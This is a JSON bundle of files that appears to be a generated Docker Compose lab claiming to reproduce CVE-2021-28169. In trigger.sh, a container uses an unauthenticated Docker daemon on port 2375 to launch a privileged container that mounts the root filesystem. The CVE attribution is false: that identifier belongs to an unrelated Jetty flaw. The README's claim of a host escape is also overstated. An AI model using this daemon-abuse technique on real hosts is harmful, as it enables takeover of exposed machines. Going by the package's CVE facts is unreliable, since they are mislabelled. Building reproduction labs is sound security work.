{
    "files": [
        {
            "location": "./../../dockers/CVE-2021-28169/custom_no_tool/docker-compose.yml",
            "content": "services:\n  vulnerable_engine:\n    build: ./engine\n    privileged: true\n    environment:\n      - DOCKER_TLS_CERTDIR=\n    ports:\n      - \"2375:2375\"\n    command: [\"dockerd-entrypoint.sh\", \"dockerd\", \"-H\", \"tcp://0.0.0.0:2375\", \"-H\", \"unix:///var/run/docker.sock\", \"--storage-driver=overlay2\"]\n    healthcheck:\n      test: [\"CMD\", \"docker\", \"info\"]\n      interval: 2s\n      timeout: 5s\n      start_period: 5s\n      retries: 20\n  exploiter:\n    build: ./app\n    depends_on:\n      vulnerable_engine:\n        condition: service_healthy\n    environment:\n      - DOCKER_HOST=tcp://vulnerable_engine:2375\n    command: [\"sh\", \"/trigger.sh\"]\n    restart: \"no\""
        },
        {
            "location": "./../../dockers/CVE-2021-28169/custom_no_tool/engine/Dockerfile",
            "content": "FROM docker:20.10.4-dind\nRUN apk add --no-cache curl"
        },
        {
            "location": "./../../dockers/CVE-2021-28169/custom_no_tool/app/Dockerfile",
            "content": "FROM alpine:3.14\nRUN apk add --no-cache docker\nCOPY trigger.sh /trigger.sh\nRUN chmod +x /trigger.sh\nCMD [\"sh\", \"/trigger.sh\"]"
        },
        {
            "location": "./../../dockers/CVE-2021-28169/custom_no_tool/app/trigger.sh",
            "content": "#!/bin/sh\n# Wait until Docker daemon is reachable\nwhile ! docker info >/dev/null 2>&1; do\n  echo \"Waiting for Docker daemon...\"\n  sleep 1\ndone\n\n# Exploit attempt for CVE-2021-28169 \u2013 leveraging an insecure Docker daemon (2375) exposed by the vulnerable_engine container.\n# The payload tries to mount the host filesystem inside a new privileged container.\n\ndocker run --rm --privileged -v /:/host -w /host alpine:3.14 sh -c \"echo 'Listing root of host (first 10 entries):'; ls -1 | head\"\n\necho \"Exploit attempt finished. If you see host filesystem listings above, the vulnerability is present.\""
        },
        {
            "location": "./../../dockers/CVE-2021-28169/custom_no_tool/README.md",
            "content": "# CVE-2021-28169 Reproduction Environment\n\nThis repository contains a minimal Docker\u2011Compose setup that reproduces the **CVE\u20112021\u201128169** vulnerability.\n\n## How it works\n- `vulnerable_engine` runs an old Docker Engine (`docker:20.10.4-dind`) with the Docker daemon exposed on **TCP port 2375** without TLS. The daemon is started with both a TCP listener and a Unix socket and uses the `overlay2` storage driver to ensure compatibility with modern kernels.\n- `exploiter` is a tiny Alpine\u2011based container equipped with the Docker CLI. It connects to the insecure daemon (`DOCKER_HOST=tcp://vulnerable_engine:2375`) and attempts to create a privileged container that mounts the host root filesystem (`-v /:/host`).\n- The `vulnerable_engine` service includes a healthcheck that waits for the daemon to be ready before starting the exploiter.\n- The `trigger.sh` script also polls `docker info` before running the exploit, ensuring the daemon is reachable.\n\n## Deploying the environment\n```bash\ncd ./../../dockers/CVE-2021-28169/custom_no_tool\ndocker compose up --build\n```\nThe `exploiter` service runs once, performs the exploit, prints the result, and then exits.\n\n## Expected outcome\nWhen the compose brings the stack up, you should see output similar to:\n```\nWaiting for Docker daemon...\nListing root of host (first 10 entries):\nbin\nboot\nde\netc\nhome\n... (other entries)\nExploit attempt finished. If you see host filesystem listings above, the vulnerability is present.\n```\nIf the host root directory is displayed, the vulnerable Docker daemon allowed the container to escape its isolation, confirming the CVE is exploitable.\n\n## Clean up\n```bash\ndocker compose down -v\n```\nThis stops and removes all containers and the temporary volumes."
        }
    ],
    "directory_tree": "./../../dockers/CVE-2021-28169/custom_no_tool"
}